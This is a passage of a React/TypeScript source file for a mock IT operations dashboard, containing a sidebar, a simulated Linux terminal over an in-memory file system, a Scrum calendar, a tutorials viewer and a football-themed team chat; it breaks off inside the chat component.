import React, { useState, useEffect } from 'react';
import { GoogleGenAI } from "@google/genai";
import { 
  LayoutDashboard, 
  AlertCircle, 
  Terminal as TerminalIcon, 
  Settings, 
  Database, 
  Activity, 
  Server, 
  Search,
  Bell,
  User,
  Mail,
  ChevronRight,
  RefreshCw,
  Play,
  Save,
  Plus,
  Table,
  Download,
  Filter,
  Network,
  Cloud,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Globe,
  Shield,
  Key,
  Cpu,
  HardDrive,
  ArrowRight,
  Layers,
  Wrench,
  Box,
  FileCode,
  FileText,
  Book,
  FileSpreadsheet,
  StickyNote,
  Bold,
  Italic,
  Underline,
  List,
  AlignLeft,
  AlignCenter,
  AlignRight,
  Grid,
  LineChart as LucideLineChart,
  BarChart3,
  Container,
  Zap,
  MessageSquare,
  Send,
  MoreVertical,
  Phone,
  Video,
  Info,
  BookOpen,
  ExternalLink,
  Code2,
  Lightbulb,
  Calendar as CalendarIcon,
  Clock,
  MapPin,
  ShoppingBag,
  Sprout,
  TreePine,
  Truck,
  Leaf,
  Eye,
  Users,
  Smartphone,
  Monitor,
  CreditCard,
  ShoppingCart,
  Share2
} from 'lucide-react';
import { 
  ReactFlow, 
  Background, 
  Controls, 
  MiniMap, 
  addEdge, 
  useNodesState, 
  useEdgesState,
  Connection,
  Edge,
  Node,
  Panel
} from '@xyflow/react';
import '@xyflow/react/dist/style.css';
import { motion, AnimatePresence } from 'motion/react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Separator } from '@/components/ui/separator';
import { Avatar, AvatarFallback, AvatarImage } from '@/components/ui/avatar';
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import { 
  LineChart, 
  Line, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip as RechartsTooltip, 
  ResponsiveContainer,
  AreaChart,
  Area
} from 'recharts';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { mockIncidents, systemHealth, mockDatabases, mockQueries, initialFileSystem, portalProducts, portalClients, portalCompanies, mockTutorials } from './mockData';
import { Incident, Priority, Status, DatabaseInstance, FileSystemItem, Tutorial } from './types';
import { cn } from '@/lib/utils';

// --- Components ---

const Sidebar = ({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: (t: string) => void }) => {
  const items = [
    { id: 'dashboard', icon: LayoutDashboard, label: 'Dashboard' },
    { id: 'incidents', icon: AlertCircle, label: 'Incidents' },
    { id: 'infrastructure', icon: Cloud, label: 'Infrastructure' },
    { id: 'database', icon: Database, label: 'Databases' },
    { id: 'terminal', icon: TerminalIcon, label: 'Console' },
    { id: 'tools', icon: Wrench, label: 'Tools' },
    { id: 'office365', icon: Grid, label: 'Office 365' },
    { id: 'cybersecurity', icon: Shield, label: 'Cybersecurity' },
    { id: 'chat', icon: MessageSquare, label: 'Chat with team' },
    { id: 'tutorials', icon: BookOpen, label: 'Tutoriais' },
    { id: 'calendar', icon: CalendarIcon, label: 'Calendário' },
    { id: 'ai', icon: Zap, label: 'AI Assistant' },
    { id: 'portal', icon: ShoppingBag, label: 'Portal' },
    { id: 'oracle', icon: Database, label: 'Oracle' },
    { id: 'edi', icon: Network, label: 'EDI Integrations' },
    { id: 'settings', icon: Settings, label: 'Settings' },
  ];

  return (
    <div className="w-64 bg-slate-900 text-slate-300 h-screen flex flex-col border-r border-slate-800">
      <div className="p-6 flex items-center gap-3">
        <div className="w-10 h-10 rounded-xl overflow-hidden flex items-center justify-center shrink-0 border-2 border-green-600 bg-green-400 shadow-sm">
          <img 
            src="https://picsum.photos/seed/palm-trees-sre/200/200" 
            alt="Logo" 
            className="w-full h-full object-cover"
            referrerPolicy="no-referrer"
          />
        </div>
        <span className="font-bold text-xl text-white tracking-tight">IT in real life</span>
      </div>
      
      <nav className="flex-1 px-4 space-y-1 overflow-y-auto custom-scrollbar">
        {items.map((item) => (
          <button
            key={item.id}
            onClick={() => setActiveTab(item.id)}
            className={cn(
              "w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all duration-200 group",
              activeTab === item.id 
                ? "bg-green-600 text-white" 
                : "hover:bg-slate-800 hover:text-white"
            )}
          >
            <item.icon className={cn("w-5 h-5", activeTab === item.id ? "text-white" : "text-slate-400 group-hover:text-white")} />
            <span className="font-medium">{item.label}</span>
          </button>
        ))}
      </nav>

      <div className="p-4 border-t border-slate-800">
        <div className="flex items-center gap-3 px-3 py-2">
          <Avatar className="w-8 h-8 border border-slate-700">
            <AvatarImage src="https://github.com/shadcn.png" />
            <AvatarFallback>CP</AvatarFallback>
          </Avatar>
          <div className="flex-1 overflow-hidden">
            <p className="text-sm font-medium text-white truncate">Carlos Pedro Gomes</p>
            <p className="text-xs text-slate-500 truncate">Lead SRE</p>
          </div>
        </div>
      </div>
    </div>
  );
};

const PriorityBadge = ({ priority }: { priority: Priority }) => {
  const colors = {
    Critical: "bg-red-500/10 text-red-500 border-red-500/20",
    High: "bg-orange-500/10 text-orange-500 border-orange-500/20",
    Medium: "bg-yellow-500/10 text-yellow-500 border-yellow-500/20",
    Low: "bg-blue-500/10 text-blue-500 border-blue-500/20",
  };
  return (
    <Badge variant="outline" className={cn("font-semibold", colors[priority])}>
      {priority}
    </Badge>
  );
};

const StatusBadge = ({ status }: { status: Status }) => {
  const colors = {
    'Open': "bg-slate-100 text-slate-700",
    'In Progress': "bg-blue-100 text-blue-700",
    'Resolved': "bg-green-100 text-green-700",
  };
  return (
    <Badge variant="secondary" className={cn("font-medium", colors[status])}>
      {status}
    </Badge>
  );
};

const Terminal = ({ logs, showPrompt = true }: { logs: string[], showPrompt?: boolean }) => {
  return (
    <div className="bg-black rounded-lg border border-slate-800 font-mono text-sm p-4 h-full flex flex-col">
      <div className="flex items-center gap-2 mb-3 border-bottom border-slate-800 pb-2">
        <div className="flex gap-1.5">
          <div className="w-3 h-3 rounded-full bg-red-500" />
          <div className="w-3 h-3 rounded-full bg-yellow-500" />
          <div className="w-3 h-3 rounded-full bg-green-500" />
        </div>
        <span className="text-slate-500 text-xs ml-2">bash — ops-console — 80x24</span>
      </div>
      <ScrollArea className="flex-1">
        <div className="space-y-1">
          {logs.map((log, i) => {
            const isError = log.includes('[ERROR]') || log.includes('failed') || log.includes('error');
            const isWarn = log.includes('[WARN]') || log.includes('warn');
            const isInfo = log.includes('[INFO]');
            const isDebug = log.includes('[DEBUG]');

            return (
              <div key={i} className="flex gap-2">
                {showPrompt && <span className="text-green-500 shrink-0">$</span>}
                <span className={cn(
                  "break-all",
                  isError ? "text-red-400" : 
                  isWarn ? "text-yellow-400" : 
                  isInfo ? "text-blue-400" : 
                  isDebug ? "text-slate-500" :
                  "text-slate-300"
                )}>
                  {log}
                </span>
              </div>
            );
          })}
          {showPrompt && (
            <div className="flex gap-2">
              <span className="text-green-500 shrink-0">$</span>
              <span className="w-2 h-5 bg-slate-500 animate-pulse" />
            </div>
          )}
        </div>
      </ScrollArea>
    </div>
  );
};

const LinuxTerminal = () => {
  const [history, setHistory] = useState<{ type: 'input' | 'output' | 'error', text: string }[]>([
    { type: 'output', text: 'OpsCenter Linux Simulator v1.0.0' },
    { type: 'output', text: 'Type "help" for a list of commands.' },
  ]);
  const [input, setInput] = useState('');
  const [currentPath, setCurrentPath] = useState<string[]>(['home', 'admin']);
  const [fs, setFs] = useState<FileSystemItem>(initialFileSystem);
  const [cmdHistory, setCmdHistory] = useState<string[]>([]);
  const [terminalStyle, setTerminalStyle] = useState({
    bg: '#000000',
    color: '#00ff00',
    fontSize: 14,
    fontFamily: 'JetBrains Mono, monospace'
  });
  const [isVimMode, setIsVimMode] = useState(false);
  const [vimFile, setVimFile] = useState<{ name: string, content: string } | null>(null);

  const getDir = (path: string[], currentFs: FileSystemItem) => {
    let curr = currentFs;
    for (const p of path) {
      if (curr.children && curr.children[p]) {
        curr = curr.children[p];
      } else {
        return null;
      }
    }
    return curr;
  };

  const updateFs = (path: string[], newItem: FileSystemItem) => {
    const newFs = JSON.parse(JSON.stringify(fs));
    let curr = newFs;
    for (const p of path) {
      curr = curr.children[p];
    }
    if (!curr.children) curr.children = {};
    curr.children[newItem.name] = newItem;
    setFs(newFs);
  };

  const handleCommand = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmedInput = input.trim();
    if (!trimmedInput) return;

    setCmdHistory(prev => [...prev, trimmedInput]);
    const newHistory = [...history, { type: 'input' as const, text: trimmedInput }];
    const [cmd, ...args] = trimmedInput.split(' ');

    let output = '';
    let type: 'output' | 'error' = 'output';

    const removeItem = (path: string[], itemName: string) => {
      const newFs = JSON.parse(JSON.stringify(fs));
      let curr = newFs;
      for (const p of path) {
        curr = curr.children[p];
      }
      if (curr.children && curr.children[itemName]) {
        delete curr.children[itemName];
        setFs(newFs);
        return true;
      }
      return false;
    };

    switch (cmd) {
      case 'help':
        output = 'Available commands: ls, cd, pwd, cat, mkdir, touch, rm, echo, grep, clear, help, whoami, date, uptime, ps, top, history, vim';
        break;
      case 'vim':
        const vFile = args[0];
        if (!vFile) {
          output = 'usage: vim [file]';
          type = 'error';
        } else {
          const dir = getDir(currentPath, fs);
          const file = dir?.children?.[vFile];
          if (file && file.type === 'dir') {
            output = `vim: ${vFile}: Is a directory`;
            type = 'error';
          } else {
            setIsVimMode(true);
            setVimFile({ name: vFile, content: file?.content || '' });
            setInput('');
            return;
          }
        }
        break;
      case 'pwd':
        output = '/' + currentPath.join('/');
        break;
      case 'ls':
        const dir = getDir(currentPath, fs);
        if (dir && dir.children) {
          const items = Object.values(dir.children).map(item => 
            item.type === 'dir' ? `\x1b[34m${item.name}/\x1b[0m` : item.name
          );
          output = items.join('  ');
        }
        break;
      case 'cd':
        const target = args[0];
        if (!target || target === '~') {
          setCurrentPath(['home', 'admin']);
        } else if (target === '..') {
          if (currentPath.length > 0) {
            setCurrentPath(currentPath.slice(0, -1));
          }
        } else if (target === '/') {
          setCurrentPath([]);
        } else {
          const parts = target.split('/').filter(p => p);
          const newPath = target.startsWith('/') ? parts : [...currentPath, ...parts];
          const targetDir = getDir(newPath, fs);
          if (targetDir && targetDir.type === 'dir') {
            setCurrentPath(newPath);
          } else {
            output = `cd: no such directory: ${target}`;
            type = 'error';
          }
        }
        break;
      case 'cat':
        const fileName = args[0];
        if (!fileName) {
          output = 'usage: cat [file]';
          type = 'error';
          break;
        }
        const currentDir = getDir(currentPath, fs);
        if (currentDir && currentDir.children && currentDir.children[fileName]) {
          const file = currentDir.children[fileName];
          if (file.type === 'file') {
            output = file.content || '';
          } else {
            output = `cat: ${fileName}: Is a directory`;
            type = 'error';
          }
        } else {
          output = `cat: ${fileName}: No such file`;
          type = 'error';
        }
        break;
      case 'mkdir':
        const newDirName = args[0];
        if (!newDirName) {
          output = 'usage: mkdir [directory]';
          type = 'error';
        } else {
          const parentDir = getDir(currentPath, fs);
          if (parentDir?.children?.[newDirName]) {
            output = `mkdir: cannot create directory '${newDirName}': File exists`;
            type = 'error';
          } else {
            updateFs(currentPath, { name: newDirName, type: 'dir', children: {} });
          }
        }
        break;
      case 'touch':
        const newFileName = args[0];
        if (!newFileName) {
          output = 'usage: touch [file]';
          type = 'error';
        } else {
          updateFs(currentPath, { name: newFileName, type: 'file', content: '' });
        }
        break;
      case 'rm':
        const itemToRemove = args[0];
        if (!itemToRemove) {
          output = 'usage: rm [file|directory]';
          type = 'error';
        } else {
          if (!removeItem(currentPath, itemToRemove)) {
            output = `rm: cannot remove '${itemToRemove}': No such file or directory`;
            type = 'error';
          }
        }
        break;
      case 'echo':
        output = args.join(' ');
        break;
      case 'grep':
        const pattern = args[0];
        const fileToGrep = args[1];
        if (!pattern || !fileToGrep) {
          output = 'usage: grep [pattern] [file]';
          type = 'error';
        } else {
          const dirGrep = getDir(currentPath, fs);
          const fileGrep = dirGrep?.children?.[fileToGrep];
          if (fileGrep?.type === 'file' && fileGrep.content) {
            output = fileGrep.content.split('\n').filter(line => line.includes(pattern)).join('\n');
          } else {
            output = `grep: ${fileToGrep}: No such file`;
            type = 'error';
          }
        }
        break;
      case 'history':
        output = cmdHistory.map((c, i) => `${i + 1}  ${c}`).join('\n');
        break;
      case 'clear':
        setHistory([]);
        setInput('');
        return;
      case 'whoami':
        output = 'admin';
        break;
      case 'date':
        output = new Date().toString();
        break;
      case 'uptime':
        output = 'up 14 days, 22:14, 3 users, load average: 0.08, 0.03, 0.01';
        break;
      case 'ps':
        output = 'PID TTY          TIME CMD\n 124 tty1     00:00:01 bash\n 452 tty1     00:00:00 ps';
        break;
      case 'top':
        output = 'Tasks: 12 total, 1 running, 11 sleeping\n%Cpu(s): 2.4 us, 1.2 sy, 0.0 ni, 96.4 id\nMiB Mem : 8192.0 total, 4124.0 free, 2140.0 used';
        break;
      default:
        output = `command not found: ${cmd}`;
        type = 'error';
    }

    if (output) {
      setHistory([...newHistory, { type, text: output }]);
    } else {
      setHistory(newHistory);
    }
    setInput('');
  };

  const handleVimSave = () => {
    if (vimFile) {
      updateFs(currentPath, { name: vimFile.name, type: 'file', content: vimFile.content });
      setIsVimMode(false);
      setHistory([...history, { type: 'output', text: `vim: ${vimFile.name} saved and closed` }]);
      setVimFile(null);
    }
  };

  const handleVimQuit = () => {
    setIsVimMode(false);
    setVimFile(null);
  };

  if (isVimMode && vimFile) {
    return (
      <div className="bg-[#1e1e1e] rounded-xl border border-slate-800 font-mono text-sm h-full flex flex-col overflow-hidden shadow-2xl">
        <div className="bg-[#2d2d2d] px-4 py-2 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-2 text-slate-300">
            <FileCode className="w-4 h-4" />
            <span>VIM - {vimFile.name}</span>
          </div>
          <div className="flex gap-2">
            <Button size="sm" variant="ghost" className="h-7 text-[10px] text-green-400 hover:text-green-300 hover:bg-green-400/10" onClick={handleVimSave}>:wq (Save & Quit)</Button>
            <Button size="sm" variant="ghost" className="h-7 text-[10px] text-red-400 hover:text-red-300 hover:bg-red-400/10" onClick={handleVimQuit}>:q! (Quit)</Button>
          </div>
        </div>
        <textarea
          autoFocus
          className="flex-1 bg-transparent text-slate-300 p-4 outline-none resize-none font-mono"
          value={vimFile.content}
          onChange={(e) => setVimFile({ ...vimFile, content: e.target.value })}
          spellCheck={false}
        />
        <div className="bg-[#007acc] text-white px-4 py-0.5 text-[10px] flex justify-between">
          <span>{vimFile.name}</span>
          <span>UTF-8 | LF | Ln 1, Col 1</span>
        </div>
      </div>
    );
  }

  return (
    <div 
      style={{ backgroundColor: terminalStyle.bg, color: terminalStyle.color }}
      className="rounded-xl border border-slate-800 h-full flex flex-col overflow-hidden shadow-2xl"
    >
      <div className="bg-slate-900 px-4 py-2 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="flex gap-1.5">
            <div className="w-3 h-3 rounded-full bg-red-500/80" />
            <div className="w-3 h-3 rounded-full bg-yellow-500/80" />
            <div className="w-3 h-3 rounded-full bg-green-500/80" />
          </div>
          <span className="text-slate-400 text-xs ml-2 font-medium">admin@ops-node: ~/{currentPath.join('/')}</span>
        </div>
        <div className="flex items-center gap-3">
          <Popover>
            <PopoverTrigger>
              <Button size="icon" variant="ghost" className="h-6 w-6 text-slate-400 hover:text-white">
                <Settings className="h-3 w-3" />
              </Button>
            </PopoverTrigger>
            <PopoverContent className="w-64 p-4 bg-slate-900 border-slate-800 text-white shadow-2xl">
              <div className="space-y-4">
                <h4 className="font-bold text-xs uppercase tracking-wider text-slate-500">Terminal Settings</h4>
                <div className="space-y-2">
                  <label className="text-[10px] text-slate-400">Background Color</label>
                  <input type="color" value={terminalStyle.bg} onChange={(e) => setTerminalStyle({...terminalStyle, bg: e.target.value})} className="w-full h-8 bg-transparent border border-slate-700 rounded cursor-pointer" />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] text-slate-400">Text Color</label>
                  <input type="color" value={terminalStyle.color} onChange={(e) => setTerminalStyle({...terminalStyle, color: e.target.value})} className="w-full h-8 bg-transparent border border-slate-700 rounded cursor-pointer" />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] text-slate-400">Font Size ({terminalStyle.fontSize}px)</label>
                  <input type="range" min="10" max="24" value={terminalStyle.fontSize} onChange={(e) => setTerminalStyle({...terminalStyle, fontSize: parseInt(e.target.value)})} className="w-full" />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] text-slate-400">Font Family</label>
                  <select value={terminalStyle.fontFamily} onChange={(e) => setTerminalStyle({...terminalStyle, fontFamily: e.target.value})} className="w-full bg-slate-800 border border-slate-700 rounded text-xs p-1 outline-none">
                    <option value="JetBrains Mono, monospace">JetBrains Mono</option>
                    <option value="Fira Code, monospace">Fira Code</option>
                    <option value="Courier New, monospace">Courier New</option>
                    <option value="Inter, sans-serif">Inter (Sans)</option>
                  </select>
                </div>
              </div>
            </PopoverContent>
          </Popover>
          <div className="text-slate-500 text-[10px] uppercase tracking-widest font-bold">SSH: 10.0.0.45</div>
        </div>
      </div>
      
      <ScrollArea className="flex-1 p-4">
        <div className="space-y-1.5" style={{ fontSize: `${terminalStyle.fontSize}px`, fontFamily: terminalStyle.fontFamily }}>
          {history.map((line, i) => (
            <div key={i} className={cn(
              "break-all leading-relaxed",
              line.type === 'input' ? "brightness-125" : 
              line.type === 'error' ? "text-red-400" : "opacity-90"
            )}>
              {line.type === 'input' && (
                <span className="text-green-500 mr-2 font-bold">admin@ops-node:~$</span>
              )}
              <span className="whitespace-pre-wrap">{line.text}</span>
            </div>
          ))}
          <form onSubmit={handleCommand} className="flex items-center gap-2">
            <span className="text-green-500 font-bold shrink-0">admin@ops-node:~$</span>
            <input
              autoFocus
              value={input}
              onChange={(e) => setInput(e.target.value)}
              className="flex-1 bg-transparent border-none outline-none p-0 m-0 focus:ring-0"
              style={{ color: terminalStyle.color }}
              spellCheck={false}
            />
          </form>
        </div>
      </ScrollArea>
    </div>
  );
};

const CalendarView = () => {
  const days = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sáb'];
  const months = ['Janeiro', 'Fevereiro', 'Março', 'Abril', 'Maio', 'Junho', 'Julho', 'Agosto', 'Setembro', 'Outubro', 'Novembro', 'Dezembro'];
  
  const today = new Date();
  const currentMonth = today.getMonth();
  const currentYear = today.getFullYear();
  
  const firstDayOfMonth = new Date(currentYear, currentMonth, 1).getDay();
  const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();
  
  const calendarDays = [];
  for (let i = 0; i < firstDayOfMonth; i++) {
    calendarDays.push(null);
  }
  for (let i = 1; i <= daysInMonth; i++) {
    calendarDays.push(i);
  }

  const events = [
    { title: 'Daily SCRUM', time: '09:00', type: 'scrum', days: [1, 2, 3, 4, 5] }, // Seg a Sex
    { title: 'Sprint Planning', time: '14:00', type: 'planning', date: 15 },
    { title: 'Retrospective', time: '16:00', type: 'retro', date: 30 },
  ];

  return (
    <div className="grid grid-cols-12 gap-6 h-full">
      <div className="col-span-8 bg-white rounded-3xl border-2 border-slate-100 p-8 shadow-sm">
        <div className="flex justify-between items-center mb-8">
          <div>
            <h2 className="text-2xl font-black text-slate-900">{months[currentMonth]} {currentYear}</h2>
            <p className="text-slate-500 text-sm">Calendário de Operações & Scrum</p>
          </div>
          <div className="flex gap-2">
            <Button variant="outline" size="icon" className="rounded-xl"><ChevronRight className="w-4 h-4 rotate-180" /></Button>
            <Button variant="outline" size="icon" className="rounded-xl"><ChevronRight className="w-4 h-4" /></Button>
          </div>
        </div>

        <div className="grid grid-cols-7 gap-px bg-slate-100 border border-slate-100 rounded-2xl overflow-hidden">
          {days.map(day => (
            <div key={day} className="bg-slate-50 p-4 text-center text-xs font-bold text-slate-400 uppercase tracking-widest">
              {day}
            </div>
          ))}
          {calendarDays.map((day, idx) => {
            const isToday = day === today.getDate();
            const dayOfWeek = idx % 7;
            const hasDaily = day && dayOfWeek >= 1 && dayOfWeek <= 5;

            return (
              <div key={idx} className={cn(
                "bg-white min-h-[100px] p-2 transition-colors hover:bg-slate-50/50",
                !day && "bg-slate-50/30"
              )}>
                {day && (
                  <>
                    <span className={cn(
                      "inline-flex items-center justify-center w-7 h-7 text-sm font-bold rounded-lg mb-2",
                      isToday ? "bg-blue-600 text-white shadow-lg shadow-blue-200" : "text-slate-700"
                    )}>
                      {day}
                    </span>
                    <div className="space-y-1">
                      {hasDaily && (
                        <div className="text-[9px] bg-emerald-50 text-emerald-700 p-1.5 rounded-md border border-emerald-100 font-bold flex items-center gap-1">
                          <div className="w-1 h-1 bg-emerald-500 rounded-full" />
                          09:00 Daily
                        </div>
                      )}
                      {day === 15 && (
                        <div className="text-[9px] bg-blue-50 text-blue-700 p-1.5 rounded-md border border-blue-100 font-bold flex items-center gap-1">
                          <div className="w-1 h-1 bg-blue-500 rounded-full" />
                          14:00 Planning
                        </div>
                      )}
                    </div>
                  </>
                )}
              </div>
            );
          })}
        </div>
      </div>

      <div className="col-span-4 space-y-6">
        <Card className="rounded-3xl border-2 border-slate-100 shadow-sm overflow-hidden">
          <CardHeader className="bg-slate-900 text-white p-6">
            <CardTitle className="text-lg flex items-center gap-2">
              <Clock className="w-5 h-5 text-yellow-400" />
              Próximos Eventos
            </CardTitle>
          </CardHeader>
          <CardContent className="p-0">
            <div className="divide-y divide-slate-50">
              {[
                { title: 'Daily SCRUM', time: 'Amanhã, 09:00', type: 'Daily', color: 'bg-emerald-500' },
                { title: 'Sprint Review', time: 'Sexta, 15:00', type: 'Review', color: 'bg-blue-500' },
                { title: 'Backlog Refinement', time: 'Segunda, 10:00', type: 'Meeting', color: 'bg-purple-500' },
              ].map((event, i) => (
                <div key={i} className="p-4 hover:bg-slate-50 transition-colors flex items-center gap-4">
                  <div className={cn("w-1 h-10 rounded-full", event.color)} />
                  <div>
                    <p className="font-bold text-slate-900 text-sm">{event.title}</p>
                    <p className="text-slate-500 text-xs flex items-center gap-1">
                      <Clock className="w-3 h-3" /> {event.time}
                    </p>
                  </div>
                  <Badge variant="outline" className="ml-auto text-[10px]">{event.type}</Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        <Card className="rounded-3xl border-2 border-slate-100 shadow-sm bg-blue-600 text-white p-6">
          <div className="space-y-4">
            <div className="p-3 bg-white/10 rounded-2xl w-fit">
              <MapPin className="w-6 h-6 text-yellow-400" />
            </div>
            <div>
              <h3 className="font-bold text-lg">Sala de Guerra Virtual</h3>
              <p className="text-blue-100 text-xs mt-1">Todas as Dailies acontecem no canal de voz "War Room" no Chat.</p>
            </div>
            <Button className="w-full bg-white text-blue-600 hover:bg-blue-50 font-bold rounded-xl">
              Entrar na Call
            </Button>
          </div>
        </Card>
      </div>
    </div>
  );
};

const TutorialsView = () => {
  const [selectedTutorial, setSelectedTutorial] = useState(mockTutorials[0].id);

  const currentTutorial = mockTutorials.find(t => t.id === selectedTutorial);

  return (
    <div className="grid grid-cols-12 gap-6 h-full">
      <div className="col-span-4 space-y-4 flex flex-col h-full min-h-0">
        <h2 className="text-2xl font-bold text-slate-900 px-2 shrink-0">Tutoriais SRE</h2>
        <ScrollArea className="flex-1 pr-4 min-h-0">
          <div className="p-1 space-y-3">
            {mockTutorials.map((t) => (
              <button
                key={t.id}
                onClick={() => setSelectedTutorial(t.id)}
                className={cn(
                  "w-full text-left p-4 rounded-2xl border-2 transition-all group",
                  selectedTutorial === t.id 
                    ? "border-blue-600 bg-blue-50 shadow-md" 
                    : "border-slate-100 bg-white hover:border-slate-200 hover:shadow-sm"
                )}
              >
                <div className="flex justify-between items-start mb-2">
                  <Badge variant="outline" className={cn(
                    "text-[10px] uppercase tracking-wider",
                    selectedTutorial === t.id ? "bg-blue-100 text-blue-700 border-blue-200" : "bg-slate-100 text-slate-500"
                  )}>
                    {t.category}
                  </Badge>
                  <span className="text-[10px] font-bold text-slate-400">{t.difficulty}</span>
                </div>
                <h3 className={cn("font-bold text-sm mb-1", selectedTutorial === t.id ? "text-blue-900" : "text-slate-800")}>
                  {t.title}
                </h3>
                <p className="text-xs text-slate-500 line-clamp-2 leading-relaxed">
                  {t.description}
                </p>
              </button>
            ))}
          </div>
        </ScrollArea>
      </div>

      <div className="col-span-8">
        <AnimatePresence mode="wait">
          <motion.div
            key={selectedTutorial}
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="bg-white rounded-3xl border-2 border-slate-100 h-full overflow-hidden flex flex-col shadow-sm"
          >
            <div className="p-8 border-b border-slate-50 bg-slate-50/50">
              <div className="flex items-center gap-3 mb-4">
                <div className="p-3 bg-blue-600 rounded-2xl shadow-lg shadow-blue-200">
                  <Lightbulb className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-2xl font-black text-slate-900 tracking-tight">{currentTutorial?.title}</h1>
                  <p className="text-slate-500 text-sm">{currentTutorial?.description}</p>
                </div>
              </div>
            </div>

            <ScrollArea className="flex-1 p-8">
              <div className="max-w-2xl space-y-8">
                {currentTutorial?.steps.map((step, index) => (
                  <div key={index} className="relative pl-12">
                    <div className="absolute left-0 top-0 w-8 h-8 bg-slate-900 text-white rounded-full flex items-center justify-center font-bold text-sm shadow-md">
                      {index + 1}
                    </div>
                    {index !== currentTutorial.steps.length - 1 && (
                      <div className="absolute left-4 top-8 w-0.5 h-full bg-slate-100" />
                    )}
                    <div className="space-y-2">
                      <h4 className="text-lg font-bold text-slate-900">{step.title}</h4>
                      <div className="bg-slate-50 border border-slate-100 rounded-xl p-4">
                        <p className="text-slate-600 text-sm leading-relaxed mb-3">{step.content}</p>
                        <div className="flex items-center gap-2 text-[10px] font-mono text-blue-600 bg-blue-50 w-fit px-2 py-1 rounded">
                          <TerminalIcon className="w-3 h-3" />
                          <span>{step.title.toLowerCase().replace(/\s+/g, '-')}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </ScrollArea>
          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
};

const ChatView = () => {
  const [selectedMember, setSelectedMember] = useState('CR7');
  const [message, setMessage] = useState('');
  const [chatHistory, setChatHistory] = useState([
    { id: 1, sender: 'CR7', text: 'Guys, the SAP integration is back up. I fixed the latency issue.', time: '10:45 AM' },
    { id: 2, sender: 'Messi', text: 'Great job Cristiano. I am checking the database clusters now.', time: '10:47 AM' },
    { id: 3, sender: 'Zidane', text: 'Keep an eye on the load balancer. We have a spike in traffic.', time: '10:50 AM' },
    { id: 4, sender: 'Ronaldinho', text: 'I just applied a security patch to the gateway. Magic!', time: '11:02 AM' },
    { id: 5, sender: 'Neymar', text: 'Frontend is looking smooth. No more flickering.', time: '11:15 AM' },
  ]);

  const members = [
    { id: 'CR7', name: 'CR7', role: 'Striker / Lead Engineer', status: 'online', avatar: 'https://picsum.photos/seed/cr7/100/100' },
    { id: 'Messi', name: 'Messi', role: 'Playmaker / Architect', status: 'online', avatar: 'https://picsum.photos/seed/messi/100/100' },
    { id: 'Pele', name: 'Pele', role: 'The King / CTO', status: 'offline', avatar: 'https://picsum.photos/seed/pele/100/100' },
    { id: 'Zidane', name: 'Zidane', role: 'Midfield Maestro / Manager', status: 'away', avatar: 'https://picsum.photos/seed/zidane/100/100' },
    { id: 'Maradona', name: 'Maradona', role: 'Legend / DevOps Guru', status: 'offline', avatar: 'https://picsum.photos/seed/maradona/100/100' },
    { id: 'Neymar', name: 'Neymar', role: 'Skillful / Frontend Lead', status: 'online', avatar: 'https://picsum.photos/seed/neymar/100/100' },
    { id: 'Ronaldinho', name: 'Ronaldinho Gaucho', role: 'Magician / Security Expert', status: 'online', avatar: 'https://picsum.photos/seed/ronaldinho/100/100' },
    { id: 'Fenomeno', name: 'Ronaldo Fenomeno', role: 'The Phenomenon / Backend Lead', status: 'away', avatar: 'https://picsum.photos/seed/fenomeno/100/100' },
    { id: 'Cantona', name: 'Eric Cantona', role: 'The King / Infrastructure', status: 'offline', avatar: 'https://picsum.photos/seed/cantona/100/100' },
    { id: 'Weah', name: 'George Weah', role: 'President / Cloud Architect', status: 'online', avatar: 'https://picsum.photos/seed/weah/100/100' },
  ];

  const getGreeting = () => {
    const hour = new Date().getHours();
    if (hour >= 5 && hour < 12) return 'Bom dia';
    if (hour >= 12 && hour < 18) return 'Boa tarde';
    return 'Boa noite';
  };

  const handleSendMessage = () => {
    if (!message.trim()) return;

    const newMsg = {
      id: Date.now(),
      sender: 'You',
      text: message,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    setChatHistory(prev => [...prev, newMsg]);
    const currentMessage = message;
    setMessage('');

    // Check for mentions
    members.forEach(member => {
      const mention = `@${member.id.toLowerCase()}`;
      const mentionFullName = `@${member.name.toLowerCase().replace(/\s+/g, '')}`;
      
      if (currentMessage.toLowerCase().includes(mention) || currentMessage.toLowerCase().includes(mentionFullName)) {
        setTimeout(() => {
          const response = {
            id: Date.now() + 1,
            sender: member.id,
            text: `${getGreeting()}! Como posso ajudar com o sistema hoje?`,
            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
          };
          setChatHistory(prev => [...prev, response]);
        }, 1000);
      }
    });
  };

  return (
    <div className="flex h-full bg-white rounded-3xl border-2 border-slate-100 overflow-hidden">
      {/* Members List */}
      <div className="w-80 border-r border-slate-100 flex flex-col h-full">
        <div className="p-6 border-b border-slate-100 shrink-0">
          <h2 className="text-xl font-bold">Team Chat</h2>
          <div className="mt-4 relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
            <input 
